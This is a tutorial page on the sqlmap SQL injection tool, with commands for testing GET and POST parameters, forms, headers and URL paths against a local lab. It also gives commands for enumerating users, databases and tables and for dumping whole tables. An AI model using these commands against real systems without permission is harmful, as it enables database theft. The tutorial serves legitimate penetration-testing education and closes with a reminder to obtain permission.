---
title: "An Introduction to Using sqlmap for SQL Injection Testing"
description: "Learn more about SQLMap"
icon: "code"
draft: false
---

## Introduction

Using sqlmap can be challenging if you're unfamiliar with it. This tutorial aims to present the essential functionalities of this popular SQL injection tool in a quick and straightforward manner. Before using sqlmap, ensure you have the latest release and a Python interpreter installed. Most Linux distributions come with Python by default. If you're not using Linux or don't have Python installed, download and install it.

You'll also need a vulnerable website to test. For this tutorial, we are using a simulation environment hosted locally and available on port 8888.

## What is sqlmap?

**sqlmap** is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws in web applications. SQL injection is a common attack vector that allows attackers to interfere with the queries an application makes to its database. By leveraging this vulnerability, an attacker can retrieve or manipulate sensitive data stored in the database, and in some cases, gain administrative access to the underlying system.

### Key Features of sqlmap

1. **Automated Testing**:

   - sqlmap automates the detection and exploitation of SQL injection vulnerabilities, simplifying the process for penetration testers and security professionals.

2. **Wide Range of SQL Injection Techniques**:

   - Supports a variety of SQL injection techniques, including time-based blind, boolean-based blind, error-based, UNION query-based, and out-of-band.

3. **Database Fingerprinting**:

   - Automatically determines the database management system (DBMS) and version.

4. **Database Extraction**:

   - Capable of extracting data from the database, such as database names, tables, columns, and records.

5. **Advanced Exploitation Features**:

   - Offers advanced functionalities like retrieving database users, password hashes, and executing commands on the operating system via out-of-band connections.

6. **Integration with Other Tools**:

   - Can be integrated with other tools and scripts to enhance testing capabilities.

7. **Support for Various DBMS**:

   - Supports numerous database management systems including MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, IBM DB2, and more.

8. **Customizable and Extensible**:
   - Highly customizable with numerous options and flags to tailor attacks. Users can also extend its functionality with custom scripts and plugins.

### Typical Use Cases

1. **Penetration Testing**:

   - Security professionals use sqlmap to identify and exploit SQL injection vulnerabilities during penetration testing engagements.

2. **Vulnerability Assessment**:

   - It is used as part of vulnerability assessments to evaluate the security posture of web applications and identify potential risks.

3. **Security Research**:

   - Researchers use sqlmap to study SQL injection techniques and develop new methods for detecting and preventing such vulnerabilities.

4. **Compliance Testing**:
   - Organizations use sqlmap to ensure their web applications comply with security standards and regulations by identifying and mitigating SQL injection vulnerabilities.

## Installing SQLMap
You can run the following command
```sh
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python3 sqlmap.py
```
You should see something like this:

<a target='_blank'><img src='https://i.postimg.cc/hj62GQCg/image.png' border='0' alt='image'/></a>

To see the help options, run the following command:

```sh
python sqlmap.py --help
```

If you don't see the sqlmap help output, double-check the setup instructions.

## Testing GET Parameters

Now you are ready to test a vulnerable GET parameter. Run sqlmap with the following syntax, specifying the URL with the `-u` (or `--url`) parameter, including GET parameters and a random value for each one:

```sh
python sqlmap.py -u "http(s)://target[:port]/[...]/[page]?param=val[&...]"
```

### Example

Testing a GET parameter with sqlmap:

```sh
python sqlmap.py -u "http://127.0.0.1:8888/cases/productsCategory.php?category=1"
```

## Testing POST Parameters

By default, sqlmap tests only GET parameters. You can specify POST parameters using the `--data` option, and sqlmap will test both GET and POST parameters indicated:

```sh
python sqlmap.py --data "param=val[&...]" -u "http(s)://target[:port]/[...]/[page]"
```

### Example

Testing POST parameters with sqlmap:

```sh
python sqlmap.py --data "username=xyz&password=xyz&submit=xyz" -u "http://127.0.0.1:8888/cases/login.php"
```

**Note:** Always specify the submit parameter name and its default value to avoid incorrect scan results.

## Parsing Forms

Sqlmap can automatically parse and test all forms on a webpage, which is useful in many situations:

```sh
python sqlmap.py --forms -u "http(s)://target[:port]/[...]/[page]"
```

### Example

Parsing forms with sqlmap:

```sh
python sqlmap.py --forms -u "http://127.0.0.1:8888/cases/productsCategory.php"
```

## Adjusting the Level of Tests

Sqlmap defaults to testing GET and POST parameters but can test additional entry points like HTTP headers by adjusting the `--level` option (levels 1 to 5, with 1 being the default):

```sh
python sqlmap.py -u "http(s)://target[:port]/[...]/[page]" --level 5
```

## Testing URL Paths

For parameters included inside URI paths, append an asterisk (\*) after each segment to specify where to try SQL injection:

```sh
python sqlmap.py -u "http://host/page/param-value*/"
```

## Extracting Information with sqlmap

Sqlmap simplifies extracting information from databases, even without direct result display on the vulnerable webpage.

### Options for Extracting Information:

- Recover session user:
  ```sh
  python sqlmap.py -u "http://target" --current-user
  ```
- Detect current database:
  ```sh
  python sqlmap.py -u "http://target" --current-db
  ```
- Check if session user is a database administrator:
  ```sh
  python sqlmap.py -u "http://target" --is-dba
  ```
- List database system users:
  ```sh
  python sqlmap.py -u "http://target" --users
  ```
- List databases:
  ```sh
  python sqlmap.py -u "http://target" --dbs
  ```

### Enumerating Tables

When the session user has read access to system tables, sqlmap can enumerate tables:

```sh
python sqlmap.py -u "http://target" --tables
```

Additional options:

- Restrict results to a specified database:
  ```sh
  python sqlmap.py -u "http://target" -D database_name --tables
  ```
- Exclude system tables:
  ```sh
  python sqlmap.py -u "http://target" --exclude-sysdbs --tables
  ```

### Enumerating Columns

Sqlmap can also enumerate columns if the session user has read access to the relevant system tables:

```sh
python sqlmap.py -u "http://target" --columns
```

Additional options:

- Restrict results to a specified database and table:
  ```sh
  python sqlmap.py -u "http://target" -D database_name -T table_name --columns
  ```

### Dumping Tables

Attackers can dump entire tables or databases using the following options:

```sh
python sqlmap.py -u "http://target" --dump
```

Additional options:

- Restrict extracted data:
  ```sh
  python sqlmap.py -u "http://target" -D database_name -T table_name --dump
  ```
- Exclude system tables:
  ```sh
  python sqlmap.py -u "http://target" --exclude-sysdbs --dump
  ```

## Conclusion

Sqlmap is a powerful and versatile tool for SQL injection testing. This tutorial has covered the essential functionalities to get you started with sqlmap, from installation to extracting database information. Always use sqlmap responsibly and ensure you have permission before conducting any tests.
